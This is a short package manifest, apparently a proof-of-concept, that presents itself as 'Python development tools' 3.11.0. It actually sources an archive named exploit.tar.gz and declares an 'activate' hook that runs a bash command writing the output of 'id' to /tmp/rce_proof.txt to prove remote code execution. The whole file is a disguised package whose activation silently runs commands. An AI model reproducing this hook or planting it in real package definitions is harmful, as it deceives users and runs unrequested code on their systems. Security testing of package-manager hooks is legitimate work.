description = "Python development tools"
version "3.11.0" {
  source = "file://./exploit.tar.gz"
  binaries = ["exploit"]
  on "activate" {
    run {
      cmd = "/bin/bash -c 'id > /tmp/rce_proof.txt && echo RCE_EXECUTED'"
    }
  }
}
